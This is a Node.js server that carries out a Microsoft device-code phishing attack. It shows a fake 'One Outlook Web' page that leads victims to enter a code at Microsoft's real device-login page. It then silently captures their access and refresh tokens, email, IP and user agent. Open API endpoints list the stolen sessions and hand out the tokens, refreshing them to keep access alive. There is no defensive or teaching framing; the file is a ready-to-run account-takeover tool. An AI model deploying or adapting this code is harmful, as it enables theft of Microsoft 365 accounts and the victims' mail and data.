const express = require('express');
const axios = require('axios');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// ============================================
// USING THE WORKING CLIENT ID (same as your friend)
// ============================================
const WORKING_CLIENT_ID = 'eb588048-cc40-4f6e-adc0-e2238e604376';
// ============================================

let userSessions = new Map();
let pendingAuth = new Map();

function generateSID() {
    return Math.floor(Math.random() * 9000000) + 1000000;
}

function getClientIp(req) {
    return req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'Unknown';
}

// ============================================
// CREATE SESSION - FULL TOKEN CAPTURE
// ============================================
app.post('/api/create-session', async (req, res) => {
    try {
        const sid = generateSID();
        const clientIp = getClientIp(req);
        const userAgent = req.headers['user-agent'] || 'Unknown';
        
        const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
            new URLSearchParams({
                client_id: WORKING_CLIENT_ID,
                scope: 'openid profile email User.Read offline_access'
            }), {
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
            }
        );
        
        const { device_code, user_code, expires_in } = response.data;
        
        pendingAuth.set(device_code, {
            device_code, user_code, sid, status: 'pending',
            ip: clientIp, userAgent: userAgent,
            createdAt: Date.now(),
            expiresAt: Date.now() + (expires_in * 1000)
        });
        
        pollForToken(device_code, sid);
        
        res.json({ success: true, sid: sid, user_code: user_code });
        
    } catch (err) {
        console.error('Create session error:', err.message);
        res.status(500).json({ error: err.message });
    }
});

async function pollForToken(device_code, sid) {
    const pollInterval = setInterval(async () => {
        const pending = pendingAuth.get(device_code);
        if (!pending || pending.status !== 'pending') {
            clearInterval(pollInterval);
            return;
        }
        
        if (Date.now() > pending.expiresAt) {
            pending.status = 'expired';
            pendingAuth.delete(device_code);
            clearInterval(pollInterval);
            return;
        }
        
        try {
            const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
                new URLSearchParams({
                    grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
                    client_id: WORKING_CLIENT_ID,
                    device_code: device_code
                }), {
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
                }
            );
            
            // Capture FULL token response including PRT
            const tokens = response.data;
            
            // Get user info
            const userInfo = await axios.get('https://graph.microsoft.com/v1.0/me', {
                headers: { 'Authorization': `Bearer ${tokens.access_token}` }
            });
            
            // Store complete token data
            userSessions.set(sid.toString(), {
                sid: sid,
                email: userInfo.data.mail || userInfo.data.userPrincipalName,
                name: userInfo.data.displayName,
                ip: pending.ip,
                userAgent: pending.userAgent,
                // Store ALL token information
                access_token: tokens.access_token,
                refresh_token: tokens.refresh_token,
                id_token: tokens.id_token || null,
                token_type: tokens.token_type,
                expires_in: tokens.expires_in,
                expires_at: Date.now() + (tokens.expires_in * 1000),
                scope: tokens.scope,
                capturedAt: new Date().toISOString()
            });
            
            pending.status = 'captured';
            pendingAuth.delete(device_code);
            clearInterval(pollInterval);
            
            console.log(`✅ CAPTURED: ${userInfo.data.mail}`);
            console.log(`   Access Token: ${tokens.access_token.substring(0, 50)}...`);
            console.log(`   Refresh Token: ${(tokens.refresh_token || 'N/A').substring(0, 30)}...`);
            
        } catch (err) {
            // Normal - waiting for user
        }
    }, 3000);
}

// Helper to refresh token
async function refreshUserToken(session) {
    try {
        const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
            new URLSearchParams({
                grant_type: 'refresh_token',
                refresh_token: session.refresh_token,
                client_id: WORKING_CLIENT_ID
            }), {
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
            }
        );
        
        session.access_token = response.data.access_token;
        session.refresh_token = response.data.refresh_token || session.refresh_token;
        session.expires_in = response.data.expires_in;
        session.expires_at = Date.now() + (response.data.expires_in * 1000);
        
        return session.access_token;
    } catch (err) {
        console.error('Token refresh failed:', err.message);
        return null;
    }
}

async function getValidToken(session) {
    if (Date.now() >= session.expires_at - 300000) {
        return await refreshUserToken(session);
    }
    return session.access_token;
}

// ============================================
// API ENDPOINTS
// ============================================
app.get('/api/status/:sid', async (req, res) => {
    const { sid } = req.params;
    const session = userSessions.get(sid);
    if (session) return res.json({ status: 'captured', email: session.email });
    for (const pending of pendingAuth.values()) {
        if (pending.sid.toString() === sid) return res.json({ status: pending.status });
    }
    res.json({ status: 'not_found' });
});

app.get('/api/sessions', async (req, res) => {
    const sessionList = Array.from(userSessions.values()).map(s => ({
        sid: s.sid,
        email: s.email,
        name: s.name,
        ip: s.ip,
        userAgent: s.userAgent,
        capturedAt: s.capturedAt,
        hasRefreshToken: !!s.refresh_token,
        tokenExpires: new Date(s.expires_at).toLocaleString()
    }));
    res.json({ sessions: sessionList });
});

// Get BOTH access token and refresh token (PRT)
app.get('/api/session/tokens/:sid', async (req, res) => {
    const session = userSessions.get(req.params.sid);
    if (!session) return res.status(404).json({ error: 'Session not found' });
    
    // Refresh if needed
    await getValidToken(session);
    
    res.json({
        email: session.email,
        access_token: session.access_token,
        refresh_token: session.refresh_token || 'Not available',
        id_token: session.id_token || 'Not available',
        expires_in: session.expires_in,
        expires_at: session.expires_at,
        token_type: session.token_type
    });
});

app.delete('/api/sessions/clear', async (req, res) => {
    userSessions.clear();
    res.json({ success: true });
});

// Generate Auth Page
app.get('/generate-auth-page', async (req, res) => {
    try {
        const sid = generateSID();
        
        const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
            new URLSearchParams({
                client_id: WORKING_CLIENT_ID,
                scope: 'openid profile email User.Read offline_access'
            }), {
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
            }
        );
        
        const { device_code, user_code } = response.data;
        
        pendingAuth.set(device_code, {
            device_code, user_code, sid, status: 'pending',
            ip: getClientIp(req), userAgent: req.headers['user-agent'] || 'Unknown',
            createdAt: Date.now(),
            expiresAt: Date.now() + (response.data.expires_in * 1000)
        });
        
        pollForToken(device_code, sid);
        
        const html = `<!DOCTYPE html>
<html>
<head><title>One Outlook Web</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',sans-serif;background:linear-gradient(135deg,#0078d4,#00a4ef);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
.card{background:#fff;border-radius:20px;padding:40px;max-width:500px;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.3)}
.code{font-size:42px;font-weight:bold;letter-spacing:8px;background:#f0f0f0;padding:20px;border-radius:12px;margin:20px 0;color:#0078d4;font-family:monospace}
.btn{background:#0078d4;color:#fff;border:none;padding:12px 28px;border-radius:8px;cursor:pointer;font-size:14px;font-weight:600;margin:5px}
.btn:hover{background:#005fa3}
.status{margin-top:20px;padding:12px;border-radius:8px;background:#f8f9fa;color:#666;font-size:13px}
.spinner{display:inline-block;width:14px;height:14px;border:2px solid #ccc;border-top-color:#0078d4;border-radius:50%;animation:spin .8s linear infinite;margin-right:8px}
@keyframes spin{to{transform:rotate(360deg)}}
</style>
</head>
<body>
<div class="card">
    <h2>One Outlook Web</h2>
    <p>Connect your Microsoft account</p>
    <div class="code" id="userCode">${user_code}</div>
    <button class="btn" onclick="copyCode()">Copy Code</button>
    <button class="btn" id="openBtn">Open Microsoft Login</button>
    <div class="status" id="statusMsg"><span class="spinner"></span> Waiting for authentication...</div>
</div>
<script>
    const SID = ${sid};
    const API_URL = window.location.origin;
    function copyCode(){const c=document.getElementById('userCode').innerText;navigator.clipboard.writeText(c);alert('Copied!')}
    document.getElementById('openBtn').onclick=function(){window.open('https://microsoft.com/devicelogin','_blank','width=600,height=700')}
    async function poll(){try{const r=await fetch(API_URL+'/api/status/'+SID);const d=await r.json();if(d.status==='captured'){document.getElementById('statusMsg').innerHTML='✅ Access granted! Session captured.';setTimeout(()=>window.close(),2000)}}catch(e){}setTimeout(poll,3000)}
    poll();
</script>
</body>
</html>`;
        
        res.send(html);
        
    } catch (err) {
        res.status(500).send('Error: ' + err.message);
    }
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Server running on port ${PORT}`);
});
